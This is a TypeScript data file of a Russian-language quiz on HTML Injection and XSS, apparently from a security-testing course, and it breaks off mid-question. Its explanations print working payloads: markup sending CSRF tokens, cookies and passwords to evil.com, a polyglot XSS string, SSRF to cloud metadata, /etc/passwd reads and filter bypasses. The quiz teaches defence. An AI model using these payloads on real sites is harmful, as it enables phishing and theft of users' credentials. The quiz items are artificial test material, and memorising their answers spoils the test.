export interface QuizQuestion {
    question: string;
    answers: string[];
    correctAnswerIndex: number;
    explanation?: string;
    link?: {
        label: string;
        url: string;
    };
}

export const quizQuestions: QuizQuestion[] = [
    {
        question: "Что такое HTML Injection?",
        answers: [
            "Уязвимость, позволяющая внедрять произвольный HTML-код в веб-страницу через пользовательский ввод",
            "Внедрение SQL-запросов в базу данных",
            "Внедрение CSS-стилей через JavaScript",
            "Выполнение команд на сервере",
            "Внедрение вредоносного кода в PDF",
            "Атака на заголовки HTTP-ответа",
            "Инъекция данных в XML-документы"
        ],
        correctAnswerIndex: 0,
        explanation: "HTML Injection позволяет модифицировать структуру и содержимое страницы, внедряя новые HTML-элементы (формы, ссылки, картинки) для фишинга или дефейса.",
        link: {
            label: "OWASP: HTML Injection",
            url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection"
        }
    },
    {
        question: "Чем HTML Injection отличается от XSS?",
        answers: [
            "HTML Injection модифицирует контент страницы без выполнения JavaScript, хотя XSS часто использует HTMLi как вектор",
            "Это полностью одинаковые уязвимости",
            "HTML Injection выполняется только на сервере",
            "XSS работает только с CSS-стилями",
            "HTML Injection требует аутентификации",
            "XSS защищён от CSP, а HTMLi нет",
            "HTML Injection возможна только в email"
        ],
        correctAnswerIndex: 0,
        explanation: "HTMLi — подмножество XSS. Если можно внедрить HTML без JS (только теги), но не выполнить скрипт — это чистая HTML Injection. С JS — это XSS.",
        link: {
            label: "PortSwigger: XSS vs HTML Injection",
            url: "https://portswigger.net/web-security/cross-site-scripting"
        }
    },
    {
        question: "Какой основной риск HTML Injection?",
        answers: [
            "Фишинг (подмена форм входа), дефейс сайта, социальная инженерия, кража CSRF-токенов",
            "Remote Code Execution на сервере",
            "DDoS-атака на инфраструктуру",
            "SQL Injection в базу данных",
            "Полный контроль над сервером",
            "Кража исходного кода приложения",
            "Атака на DNS-сервер"
        ],
        correctAnswerIndex: 0,
        explanation: "Даже без выполнения JS, HTML Injection позволяет создать поддельную форму логина, перенаправить на фишинговый сайт, или украсть данные через Dangling Markup.",
        link: {
            label: "Урок HTML Injection",
            url: "https://aqwise.github.io/security_testing_course/school/injections/lesson-3"
        }
    },
    {
        question: "Что такое Dangling Markup Injection?",
        answers: [
            "Техника кражи данных путём внедрения незакрытого тега (<img src='...), который 'захватывает' часть страницы до следующей кавычки",
            "Удаление разметки со страницы",
            "Инъекция висячих указателей в память",
            "Срочная разметка для быстрой загрузки",
            "Ошибки верстки в HTML-коде",
            "Атака на DOM-дерево браузера",
            "Внедрение незакрытых комментариев"
        ],
        correctAnswerIndex: 0,
        explanation: "<img src='https://evil.com/steal? захватывает HTML до следующей ' в коде страницы, включая CSRF-токены и другие секреты.",
        link: {
            label: "PortSwigger: Dangling Markup",
            url: "https://portswigger.net/web-security/cross-site-scripting/dangling-markup"
        }
    },
    {
        question: "Какой тег чаще всего используется для фишинга при HTML Injection?",
        answers: [
            "<form> — создание поддельной формы входа с action на сервер атакующего",
            "<div> — контейнер для элементов",
            "<span> — инлайн-элемент",
            "<br> — перенос строки",
            "<p> — параграф текста",
            "<hr> — горизонтальная линия",
            "<pre> — предформатированный текст"
        ],
        correctAnswerIndex: 0,
        explanation: "<form action='https://evil.com/phish'> с полями Login/Password перекрывает оригинальную форму. Пользователь вводит данные — они уходят атакующему.",
        link: {
            label: "InfoSecWriteups: HTML Injection Phishing",
            url: "https://infosecwriteups.com/html-injection-to-mass-phishing-5701d495cdc2"
        }
    },
    {
        question: "Если фильтр удаляет <script>, это защищает от HTML Injection?",
        answers: [
            "Нет, можно внедрить <form>, <img>, <a>, <h1> для фишинга и дефейса без JavaScript",
            "Да, полная защита от всех атак",
            "Только в Firefox защищает",
            "Только в Chrome защищает",
            "Да, если фильтр рекурсивный",
            "Да, если используется CSP",
            "Защищает только от Stored HTMLi"
        ],
        correctAnswerIndex: 0,
        explanation: "HTML Injection не требует JS. Теги <form>, <base>, <meta refresh>, <iframe>, <a> позволяют фишинг, редирект, дефейс без выполнения скриптов.",
        link: {
            label: "OWASP: Testing for HTML Injection",
            url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection"
        }
    },
    {
        question: "Что такое Content Spoofing?",
        answers: [
            "Подмена содержимого страницы (текста, картинок) для обмана пользователя, часто через HTML Injection",
            "Спуфинг IP-адреса отправителя",
            "Подмена MAC-адреса устройства",
            "Подмена DNS-записей домена",
            "Фальсификация SSL-сертификатов",
            "Подмена User-Agent браузера",
            "Спуфинг электронной почты"
        ],
        correctAnswerIndex: 0,
        explanation: "Атакующий меняет текст, добавляет фейковые сообщения или предупреждения. Жертва думает, что это легитимный контент сайта.",
        link: {
            label: "OWASP: Content Spoofing",
            url: "https://owasp.org/www-community/attacks/Content_Spoofing"
        }
    },
    {
        question: "Можно ли использовать HTML Injection для кражи паролей?",
        answers: [
            "Да, создав поддельную форму входа поверх оригинальной с action на сервер атакующего",
            "Нет, пароли зашифрованы в браузере",
            "Только если пароль простой",
            "Только в устаревших браузерах",
            "Нет, это требует JavaScript",
            "Только при отсутствии HTTPS",
            "Только на мобильных устройствах"
        ],
        correctAnswerIndex: 0,
        explanation: "CSS может скрыть оригинальную форму (display:none, opacity:0), а поддельная форма примет данные. Это называется Form Hijacking.",
        link: {
            label: "Invicti: HTML Injection",
            url: "https://www.invicti.com/learn/html-injection/"
        }
    },
    {
        question: "Какие символы критичны для HTML Injection?",
        answers: [
            "< > \" ' & — они позволяют создавать теги, закрывать атрибуты, добавлять новые элементы",
            "Только точка (.) и запятая (,)",
            "Только пробел и табуляция",
            "Только кавычки (' и \")",
            "Только угловые скобки (< >)",
            "Только амперсанд (&)",
            "Только слэши (/ и \\)"
        ],
        correctAnswerIndex: 0,
        explanation: "< создаёт теги, > закрывает их, ' и \" закрывают атрибуты, & начинает HTML-сущности. Все должны экранироваться.",
        link: {
            label: "MDN: HTML Entity Encoding",
            url: "https://developer.mozilla.org/en-US/docs/Glossary/Entity"
        }
    },
    {
        question: "Как защититься от HTML Injection?",
        answers: [
            "HTML Entity Encoding всех пользовательских данных перед выводом (< → &lt;, > → &gt; и т.д.)",
            "Шифрование данных в базе данных",
            "Использование только HTTPS",
            "Запрет использования интернета",
            "Установка антивируса на сервер",
            "Перезагрузка сервера ежечасно",
            "Удаление всех HTML-тегов из кода"
        ],
        correctAnswerIndex: 0,
        explanation: "Экранирование < > ' \" & в HTML-сущности (&lt; &gt; &apos; &quot; &amp;) делает их текстом, а не частью HTML-разметки.",
        link: {
            label: "OWASP: Output Encoding",
            url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
        }
    },
    {
        question: "Что делает функция htmlspecialchars() в PHP?",
        answers: [
            "Преобразует спецсимволы в HTML-сущности (&lt;, &gt;, &amp;, &quot;), предотвращая интерпретацию как тегов",
            "Удаляет все HTML-теги из строки",
            "Выполняет HTML-код на сервере",
            "Красит HTML в разные цвета",
            "Сжимает HTML для уменьшения размера",
            "Валидирует HTML на корректность",
            "Минифицирует HTML-код"
        ],
        correctAnswerIndex: 0,
        explanation: "htmlspecialchars('<script>') возвращает '&lt;script&gt;'. Браузер отобразит это как текст, а не выполнит как тег.",
        link: {
            label: "PHP: htmlspecialchars",
            url: "https://www.php.net/manual/en/function.htmlspecialchars.php"
        }
    },
    {
        question: "Что такое Attribute Injection?",
        answers: [
            "Внедрение в значение атрибута, позволяющее добавить свои события (onmouseover) или закрыть атрибут и выйти из тега",
            "Внедрение божественных атрибутов",
            "Инъекция атрибутов в URL",
            "Атака на Cookie-атрибуты",
            "Внедрение в CSS-атрибуты",
            "Изменение атрибутов сервера",
            "Инъекция в HTML-комментарии"
        ],
        correctAnswerIndex: 0,
        explanation: "Если данные попадают в class=\"...\" без экранирования, ввод \" onclick=alert(1) добавит обработчик события.",
        link: {
            label: "PortSwigger: XSS in Attributes",
            url: "https://portswigger.net/web-security/cross-site-scripting/contexts"
        }
    },
    {
        question: "Работает ли HTML Injection в Email?",
        answers: [
            "Да, HTML-письма могут содержать внедрённый HTML (хотя почтовые клиенты блокируют большинство опасных тегов)",
            "Нет, Email — только текстовый формат",
            "Только в Outlook",
            "Только в Gmail",
            "Только в мобильных клиентах",
            "Нет, Email не поддерживает HTML",
            "Только в корпоративной почте"
        ],
        correctAnswerIndex: 0,
        explanation: "HTML-email уязвим к HTMLi для фишинга. Почтовые клиенты блокируют <script>, но пропускают <form>, <a>, <img> — хватит для атаки.",
        link: {
            label: "Email Security Best Practices",
            url: "https://owasp.org/www-community/attacks/Phishing"
        }
    },
    {
        question: "Почему strip_tags() в PHP может быть опасен?",
        answers: [
            "Он удаляет теги некорректно, может оставить содержимое, или быть обойдён специально сформированным HTML",
            "Он удаляет весь текст вместе с тегами",
            "Он удаляет базу данных",
            "Он полностью безопасен и надёжен",
            "Он работает только на ASCII-символах",
            "Он замедляет работу сервера",
            "Он требует root-доступа"
        ],
        correctAnswerIndex: 0,
        explanation: "strip_tags('<scr<script>ipt>') может оставить '<script>'. Также <img onerror=...> без закрывающего > может обойти фильтр.",
        link: {
            label: "PHP: strip_tags Security Note",
            url: "https://www.php.net/manual/en/function.strip-tags.php"
        }
    },
    {
        question: "Какой HTTP-заголовок помогает смягчить HTML Injection?",
        answers: [
            "Content-Security-Policy (CSP) — ограничивает источники контента и блокирует inline-стили/скрипты",
            "X-Frame-Options — только для clickjacking",
            "Set-Cookie — для работы с куками",
            "Host — указывает домен сервера",
            "User-Agent — идентификация браузера",
            "Accept-Encoding — сжатие данных",
            "Cache-Control — кэширование"
        ],
        correctAnswerIndex: 0,
        explanation: "CSP с style-src, frame-src, form-action ограничивает возможности HTML Injection. Например, form-action 'self' блокирует отправку форм на внешние сайты.",
        link: {
            label: "MDN: CSP",
            url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"
        }
    },
    {
        question: "Что произойдёт при внедрении <meta http-equiv='refresh' content='0;url=http://evil.com'>?",
        answers: [
            "Браузер автоматически перенаправит пользователя на evil.com (Open Redirect через HTMLi)",
            "Ничего не произойдёт",
            "Появится ошибка 404",
            "Скачается файл с evil.com",
            "Страница просто обновится",
            "Браузер заблокирует редирект",
            "Выведется предупреждение"
        ],
        correctAnswerIndex: 0,
        explanation: "<meta refresh> — мощный вектор HTMLi. Даже без JS можно перенаправить пользователя на фишинговый сайт.",
        link: {
            label: "MDN: meta refresh",
            url: "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta#attr-http-equiv"
        }
    },
    {
        question: "Можно ли использовать <iframe> при HTML Injection?",
        answers: [
            "Да, для загрузки внешнего контента (фишинговой страницы) внутри легитимной или для атаки на родительское окно",
            "Нет, iframe полностью заблокирован везде",
            "Только для загрузки видео",
            "Только для загрузки аудио",
            "Только в старых браузерах",
            "Только при отключённом CSP",
            "Нет, iframe безопасен"
        ],
        correctAnswerIndex: 0,
        explanation: "<iframe src='https://evil.com/fake-login' style='position:fixed;top:0;left:0;width:100%;height:100%'> перекрывает всю страницу фейком.",
        link: {
            label: "OWASP: Clickjacking",
            url: "https://owasp.org/www-community/attacks/Clickjacking"
        }
    },
    {
        question: "Что такое Blind HTML Injection?",
        answers: [
            "HTMLi, результат которой не виден атакующему сразу — например, в логах админа, email уведомлениях, или системах тикетов",
            "Невидимый текст на странице",
            "Инъекция для незрячих пользователей",
            "Атака с закрытыми глазами",
            "HTMLi в скрытых полях формы",
            "Инъекция в meta-теги",
            "Внедрение в CSS-комментарии"
        ],
        correctAnswerIndex: 0,
        explanation: "Как Blind XSS: пейлоад срабатывает когда админ смотрит логи или когда email отправляется пользователю. Атакующий не видит результат сразу.",
        link: {
            label: "Урок HTML Injection - Blind",
            url: "https://aqwise.github.io/security_testing_course/school/injections/lesson-3"
        }
    },
    {
        question: "Какой инструмент используют для обнаружения HTML Injection?",
        answers: [
            "Burp Suite (Scanner, Repeater), OWASP ZAP, браузерные DevTools для анализа ответа",
            "Калькулятор Windows",
            "Блокнот (Notepad)",
            "Microsoft Paint",
            "Проводник Windows",
            "VLC Media Player",
            "Microsoft Excel"
        ],
        correctAnswerIndex: 0,
        explanation: "Burp Repeater позволяет модифицировать запросы и видеть сырой HTML ответа. Scanner может автоматически искать HTMLi.",
        link: {
            label: "PortSwigger: Burp Suite",
            url: "https://portswigger.net/burp"
        }
    },
    {
        question: "Уязвим ли Markdown к HTML Injection?",
        answers: [
            "Да, если парсер разрешает 'сырой' HTML и не санитизирует его — внедрённые теги будут отрендерены",
            "Нет, Markdown полностью безопасен",
            "Только жирный текст уязвим",
            "Только курсив уязвим",
            "Нет, Markdown — это текст",
            "Только заголовки уязвимы",
            "Только ссылки уязвимы"
        ],
        correctAnswerIndex: 0,
        explanation: "Многие Markdown-парсеры (GFM, Marked) разрешают raw HTML по умолчанию. <script>alert(1)</script> в .md файле выполнится.",
        link: {
            label: "Markdown Security",
            url: "https://github.com/cure53/DOMPurify"
        }
    },
    {
        question: "Как безопасно разрешить пользователю форматировать текст?",
        answers: [
            "Использовать безопасное подмножество (BBCode) или санитайзеры (DOMPurify) с белым списком тегов",
            "Разрешить все HTML-теги",
            "Запретить любое форматирование",
            "Использовать eval() для парсинга",
            "Доверять данным от пользователя",
            "Фильтровать только <script>",
            "Использовать регулярные выражения для удаления тегов"
        ],
        correctAnswerIndex: 0,
        explanation: "DOMPurify с ALLOWED_TAGS: ['b', 'i', 'a'] разрешит только безопасные теги. BBCode ([b]текст[/b]) конвертируется в HTML на сервере безопасно.",
        link: {
            label: "DOMPurify",
            url: "https://github.com/cure53/DOMPurify"
        }
    },
    {
        question: "Что делает target='_blank' уязвимым (Tabnabbing)?",
        answers: [
            "Без rel='noopener noreferrer' новая вкладка получает доступ к window.opener и может перенаправить родительскую страницу",
            "Ничего опасного, target='_blank' безопасен",
            "Открывает две вкладки вместо одной",
            "Закрывает браузер автоматически",
            "Блокирует JavaScript в новой вкладке",
            "Отключает cookies для страницы",
            "Только для HTTPS-ссылок"
        ],
        correctAnswerIndex: 0,
        explanation: "Новая страница выполняет window.opener.location = 'https://fake-login.evil.com'. Жертва возвращается и видит фишинг.",
        link: {
            label: "MDN: rel=noopener",
            url: "https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/noopener"
        }
    },
    {
        question: "Можно ли использовать CSS для эксфильтрации данных при HTML Injection?",
        answers: [
            "Да, через CSS Injection — селекторы атрибутов и background-image запросы позволяют извлечь данные побайтово",
            "Нет, CSS только для визуального оформления",
            "Только в Internet Explorer 6",
            "Только цвета можно менять",
            "CSS не влияет на безопасность",
            "Только через @import",
            "Только в inline-стилях"
        ],
        correctAnswerIndex: 0,
        explanation: "input[value^='a']{background:url(evil.com/a)} — если значение начинается с 'a', отправится запрос. Повторяя для каждого символа, можно украсть CSRF-токен.",
        link: {
            label: "CSS Exfiltration",
            url: "https://portswigger.net/research/stealing-data-via-css-injection"
        }
    },
    {
        question: "Что такое Clickjacking?",
        answers: [
            "Атака с прозрачным iframe поверх страницы — жертва кликает на невидимую кнопку (лайк, перевод денег)",
            "Кража кликов мышкой через вирус",
            "Очень быстрые клики",
            "Клик по рекламным баннерам",
            "Атака через клавиатуру",
            "Подмена курсора мыши",
            "Двойной клик по ссылке"
        ],
        correctAnswerIndex: 0,
        explanation: "Атакующий накладывает невидимый iframe (opacity:0) с целевым сайтом. Жертва думает что кликает на кнопку игры, а на самом деле — на 'Удалить аккаунт'.",
        link: {
            label: "OWASP: Clickjacking",
            url: "https://owasp.org/www-community/attacks/Clickjacking"
        }
    },
    {
        question: "Какой тег позволяет встраивать SVG-графику?",
        answers: [
            "<svg> — векторная графика с поддержкой JavaScript и событий",
            "<canvas> — только растровая графика",
            "<paint> — такого тега не существует",
            "<draw> — такого тега не существует",
            "<vector> — не HTML-тег",
            "<image> — только внешние картинки",
            "<graphics> — не стандартный тег"
        ],
        correctAnswerIndex: 0,
        explanation: "<svg> поддерживает <script>, onload, onclick. Это делает SVG-файлы опасными при загрузке пользователями.",
        link: {
            label: "MDN: SVG",
            url: "https://developer.mozilla.org/en-US/docs/Web/SVG"
        }
    },
    {
        question: "Можно ли выполнить JavaScript внутри <svg>?",
        answers: [
            "Да, SVG поддерживает <script> и события (onload, onclick, onmouseover)",
            "Нет, SVG — только для графики",
            "Только если картинка чёрно-белая",
            "Только через CSS",
            "Только в старых браузерах",
            "Только для анимации",
            "Нет, SVG заблокирован в современных браузерах"
        ],
        correctAnswerIndex: 0,
        explanation: "<svg onload='alert(1)'> или <svg><script>alert(1)</script></svg> выполнят JS. Поэтому загрузка SVG от пользователей опасна.",
        link: {
            label: "PortSwigger: SVG XSS",
            url: "https://portswigger.net/web-security/cross-site-scripting"
        }
    },
    {
        question: "Что такое Polyglot в контексте HTML/XSS?",
        answers: [
            "Строка, валидная в разных контекстах (HTML-тег, JS-строка, URL) и срабатывающая как инъекция везде",
            "Переводчик языков программирования",
            "Человек, говорящий на многих языках",
            "Словарь терминов XSS",
            "Инструмент для тестирования",
            "Браузерное расширение",
            "Тип WAF-а"
        ],
        correctAnswerIndex: 0,
        explanation: "Polyglot: jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e",
        link: {
            label: "Polyglot XSS",
            url: "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
        }
    },
    {
        question: "Как проверить поле на HTML Injection?",
        answers: [
            "Ввести <h1>Test</h1> и проверить: отрендерился заголовок (уязвимо) или отобразились теги текстом (безопасно)",
            "Ввести 123 и посмотреть результат",
            "Ввести SQL-запрос",
            "Ввести пробел",
            "Ввести email-адрес",
            "Нажать Enter много раз",
            "Оставить поле пустым"
        ],
        correctAnswerIndex: 0,
        explanation: "Если <h1>Test</h1> отображается как большой заголовок 'Test' — HTMLi есть. Если как текст '<h1>Test</h1>' — экранирование работает.",
        link: {
            label: "OWASP: Testing for HTML Injection",
            url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection"
        }
    },
    {
        question: "Что такое Self-XSS (или Self-HTML-Injection)?",
        answers: [
            "Инъекция, срабатывающая только у самого атакующего — используется для социальной инженерии ('вставь этот код в консоль')",
            "XSS против себя автоматически",
            "Автоматический XSS без участия человека",
            "XSS без браузера",
            "XSS в мобильных приложениях",
            "XSS через Self-API",
            "Защита от XSS"
        ],
        correctAnswerIndex: 0,
        explanation: "Атакующий убеждает жертву вставить 'javascript:...' в адресную строку или код в DevTools. Пейлоад срабатывает в контексте жертвы.",
        link: {
            label: "Facebook: Self-XSS Warning",
            url: "https://www.facebook.com/help/246962205475854"
        }
    },
    {
        question: "Опасна ли HTML Injection в PDF-генераторах?",
        answers: [
            "Да, часто приводит к SSRF (<img src='http://internal-server'>), LFI или чтению локальных файлов",
            "Нет, PDF — это статичная картинка",
            "Только текст можно изменить",
            "Только шрифты уязвимы",
            "PDF-генераторы полностью безопасны",
            "Только размер страницы меняется",
            "Только через JavaScript в PDF"
        ],
        correctAnswerIndex: 0,
        explanation: "wkhtmltopdf, PrincePDF: <img src='http://169.254.169.254/latest/meta-data/'> — SSRF к AWS metadata. <iframe src='file:///etc/passwd'> — LFI.",
        link: {
            label: "PDF Generation SSRF",
            url: "https://owasp.org/www-project-web-security-testing-guide/"
        }
    },
    {
        question: "Что делает тег <base>?",
        answers: [
            "Задаёт базовый URL для всех относительных ссылок на странице — инъекция перенаправляет скрипты и картинки на сервер атакующего",
            "Делает шрифт жирным",
            "Создаёт базу данных",
            "Ничего полезного",
            "Устанавливает начальный отступ",
            "Связывается с backend-сервером",
            "Определяет базовый стиль"
        ],
        correctAnswerIndex: 0,
        explanation: "<base href='https://evil.com/'> превратит <script src='/app.js'> в загрузку https://evil.com/app.js — полный контроль над JS.",
        link: {
            label: "PortSwigger: BASE tag hijacking",
            url: "https://portswigger.net/web-security/cross-site-scripting/dangling-markup"
        }
    },
    {
        question: "Можно ли использовать <object> или <embed> для HTML Injection?",
        answers: [
            "Да, они могут загружать Flash, PDF или HTML, потенциально выполняя скрипты",
            "Нет, они устарели и не работают",
            "Только для аудиофайлов",
            "Только для видеофайлов",
            "Только в Internet Explorer",
            "Только для картинок",
            "Они заблокированы во всех браузерах"
        ],
        correctAnswerIndex: 0,
        explanation: "<embed src='data:text/html,<script>alert(1)</script>'> может выполнить JS. <object data='evil.swf'> загружал Flash (до 2020).",
        link: {
            label: "MDN: object element",
            url: "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object"
        }
    },
    {
        question: "Что такое <math> тег?",
        answers: [
            "MathML-тег для математических формул — в некоторых браузерах используется для обхода XSS-фильтров",
            "Калькулятор в HTML",
            "Тег для хранения чисел",
            "Математические операции",
            "Только для образовательных сайтов",
            "Устаревший тег",
            "Тег для графиков"
        ],
        correctAnswerIndex: 0,
        explanation: "<math><maction actiontype='statusline#http://evil.com'><mtext>Click me</mtext><mi>x</mi></maction></math> — вектор обхода некоторых WAF.",
        link: {
            label: "MDN: MathML",
            url: "https://developer.mozilla.org/en-US/docs/Web/MathML"
        }
    },
    {
        question: "Как работает атака через <textarea>?",
        answers: [
            "Внедрение </textarea><script>... позволяет выйти из textarea и выполнить код на странице",
            "Писать много текста и переполнить буфер",
            "Переполнение textarea вызывает RCE",
            "Никак, textarea безопасен",
            "Только через copy-paste",
            "Только в старых браузерах",
            "Требуется JavaScript"
        ],
        correctAnswerIndex: 0,
        explanation: "Если данные вставляются в <textarea>USER_INPUT</textarea> без экранирования, ввод '</textarea><script>alert(1)</script>' выполнит JS.",
        link: {
            label: "PortSwigger: XSS Contexts",
            url: "https://portswigger.net/web-security/cross-site-scripting/contexts"
        }
    },
    {
        question: "Что такое Mutation XSS (mXSS)?",
        answers: [
            "XSS через 'нормализацию' HTML: браузер исправляет 'сломанный' HTML, превращая безопасный текст в рабочий вектор",
            "XSS мутантов и супергероев",
            "Генетический XSS",
            "XSS Людей Икс из комиксов",
            "Постоянно меняющийся XSS",
            "XSS с мутацией вируса",
            "Автоматически генерируемый XSS"
        ],
        correctAnswerIndex: 0,
        explanation: "Фильтр пропускает '<p><script>alert(1)</p>', браузер нормализует в '<p></p><script>alert(1)</script>' — XSS срабатывает.",
        link: {
            label: "Cure53: mXSS Research",
            url: "https://cure53.de/fp170.pdf"
        }
    },
    {
        question: "Помогает ли WAF против всех HTML Injections?",
        answers: [
            "Нет, WAF можно обойти кодированием, мутациями, или приложение может требовать HTML (CMS, редакторы)",
            "Да, WAF блокирует всё",
            "Только дорогой WAF защищает",
            "Только облачный WAF работает",
            "WAF полностью надёжен",
            "WAF не нужен при HTTPS",
            "WAF заменяет экранирование"
        ],
        correctAnswerIndex: 0,
        explanation: "WAF обходят: %3Cscript%3E, <ScRiPt>, <svg/onload=...>, Unicode. CMS (WordPress) требует HTML — WAF не может блокировать всё.",
        link: {
            label: "PortSwigger: WAF Bypass",
            url: "https://portswigger.net/web-security/cross-site-scripting/contexts"
        }
    },
    {
        question: "Что такое <noscript>?",
        answers: [
            "Тег, содержимое которого отображается если JS отключён — вектор для фишинга пользователей без JS",
            "Тег для отключения скриптов",
            "Запуск скриптов без JavaScript",
            "Комментарий в HTML",
            "Альтернатива <script>",
            "Устаревший тег",
            "Тег для debugging"
        ],
        correctAnswerIndex: 0,
        explanation: "<noscript><meta http-equiv='refresh' content='0;url=evil.com'></noscript> — редирект для пользователей с отключённым JS.",
        link: {
            label: "MDN: noscript",
            url: "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/noscript"
        }
    },
    {
        question: "Можно ли через HTML Injection украсть CSRF-токен?",
        answers: [
            "Да, через Dangling Markup — незакрытый тег 'захватывает' часть страницы с токеном и отправляет на сервер атакующего",
            "Нет, CSRF-токены защищены",
            "Только если токен в URL",
            "Только из Cookie",
            "Требуется JavaScript",
            "CSRF-токены зашифрованы",
            "Только через XSS"
        ],
        correctAnswerIndex: 0,
        explanation: "<img src='https://evil.com/steal?data= захватывает HTML до следующей кавычки в коде: ...name='csrf' value='TOKEN'>... → TOKEN отправляется.",
        link: {
            label: "PortSwigger: Dangling Markup",
            url: "https://portswigger.net/web-security/cross-site-scripting/dangling-markup"
        }
    },
    {
        question: "Какой атрибут в <img> выполняет JS при ошибке загрузки?",
        answers: [
            "onerror — срабатывает если изображение не найдено, выполняет произвольный JavaScript",
            "onload — только при успешной загрузке",
            "onclick — только при клике",
            "onfail — такого атрибута не существует",
            "onerror работает только в старых браузерах",
            "onnotfound — для отсутствующих файлов",
            "onmissing — для пропущенных картинок"
        ],
        correctAnswerIndex: 0,
        explanation: "<img src=x onerror=alert(1)> — классический вектор XSS. Картинка 'x' не существует → onerror срабатывает → alert выполняется.",
        link: {
            label: "PortSwigger: XSS via img",
            url: "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
        }
    },
    {
        question: "Что такое javascript: псевдопротокол?",
        answers: [
            "Позволяет выполнять JS в href или src атрибутах: <a href='javascript:alert(1)'>",
            "Официальный протокол языка Java",
            "Протокол для JSON-данных",
            "Протокол библиотеки jQuery",
            "Шифрование JavaScript-кода",
            "Формат файлов .js",
            "API для браузера"
        ],
        correctAnswerIndex: 0,
        explanation: "javascript: выполняет код вместо навигации. <a href='javascript:document.location=\"evil.com?c=\"+document.cookie'> крадёт cookies.",
        link: {
            label: "MDN: javascript: URL",
            url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURIComponent"
        }
    },
    {
        question: "Какие кодировки используют для обхода фильтров?",
        answers: [
            "URL encoding (%3C), HTML entities (&lt;), Hex (\\x3c), Unicode (\\u003c), Base64",
            "MP3 для аудио",
            "AVI для видео",
            "ZIP для архивов",
            "JPEG для изображений",
            "PDF для документов",
            "GIF для анимации"
        ],
        correctAnswerIndex: 0,
        explanation: "<script> = %3Cscript%3E = &lt;script&gt; = \\x3cscript\\x3e = \\u003cscript\\u003e. Фильтр может декодировать не всё.",
        link: {
            label: "PortSwigger: Obfuscation",
            url: "https://portswigger.net/web-security/cross-site-scripting/contexts"
        }
    },
    {
        question: "Что такое HTTP Request Smuggling?",
        answers: [
            "Атака на рассинхронизацию frontend и backend серверов — может внедрить XSS/HTMLi в ответы другим пользователям",
            "Контрабанда HTTP-пакетов",
            "Быстрая отправка запросов",
            "Сжатие HTTP-заголовков",
            "Шифрование запросов",
            "Кэширование ответов",
            "Балансировка нагрузки"
        ],
        correctAnswerIndex: 0,
        explanation: "CL.TE или TE.CL десинхронизация позволяет 'скрыть' второй запрос внутри первого. Второй запрос может содержать XSS-пейлоад.",
        link: {
            label: "PortSwigger: Request Smuggling",
            url: "https://portswigger.net/web-security/request-smuggling"
        }
    },
    {
        question: "Можно ли внедрить HTML в HTTP-заголовки ответа?",
        answers: [
            "Через HTTP Response Splitting (CRLF Injection) можно внедрить %0d%0a и начать тело ответа с HTML",
            "Да, HTML работает в любых заголовках",
            "Только в заголовке Server",
            "Только в заголовке Date",
            "Нет, заголовки только текстовые",
            "Только через HTTPS",
            "Только в Cookie-заголовках"
        ],
        correctAnswerIndex: 0,
        explanation: "Header: value%0d%0a%0d%0a<script>alert(1)</script> — если сервер не фильтрует CRLF, браузер увидит HTML как тело ответа.",
        link: {
            label: "OWASP: HTTP Response Splitting",
            url: "https://owasp.org/www-community/attacks/HTTP_Response_Splitting"
        }
    },
    {
        question: "Как защитить Cookie от кражи через XSS/HTMLi?",
        answers: [
            "Флаги HttpOnly (запрет доступа через JS) и Secure (только HTTPS), а также SameSite",
            "Длинный пароль на куку",
            "Шифрование значения куки",
            "Не использовать cookies вообще",
            "Хранить cookies в localStorage",
            "Менять cookies каждую минуту",
            "Использовать только сессионные cookies"
        ],
        correctAnswerIndex: 0,
        explanation: "Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict — JS не может прочитать (HttpOnly), отправляется только по HTTPS (Secure).",
        link: {
            label: "MDN: Set-Cookie",
            url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie"
        }
    },
    {
        question: "Если приложение удаляет слово <script>, это надёжная защита?",
        answers: [
            "Нет, можно использовать <scr<script>ipt> (если удаляется один раз) или другие теги (img, svg, body)",
            "Да, защита надёжна",
            "Ничего нельзя сделать",
            "Можно только плакать",
            "Работает в 90% случаев",
            "Достаточно для production",
            "Рекомендуется OWASP"
        ],
        correctAnswerIndex: 0,
        explanation: "Рекурсивное удаление не поможет против <img onerror=...>. Нужен whitelist тегов или экранирование, а не blacklist.",
        link: {
            label: "OWASP: XSS Prevention",
            url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
        }
    },
    {
        question: "Что такое DOMPurify?",
        answers: [
            "Популярная JS-библиотека для санитизации HTML в браузере — защита от DOM XSS/HTMLi с минимальным влиянием на производительность",
            "Очиститель для дома",
            "Компьютерный вирус",
            "Браузерная игра",
            "CSS-фреймворк",
            "HTTP-сервер",
            "База данных"
        ],
        correctAnswerIndex: 0,
        explanation: "DOMPurify.sanitize(dirty) удаляет опасные теги (<script>) и атрибуты (onerror), оставляя безопасный HTML.",
        link: {
            label: "DOMPurify",
            url: "https://github.com/cure53/DOMPurify"
        }
    },
    {
        question: "Можно ли внедрить HTML через имя загружаемого файла?",
        answers: [
            "Да, если имя файла отображается на странице без экранирования: <img>.png станет тегом",
            "Нет, имена файлов безопасны",
            "Только в Windows",
            "Только в Linux",
            "Только для .exe файлов",
            "Имена автоматически экранируются",
            "Только для больших файлов"
        ],
        correctAnswerIndex: 0,
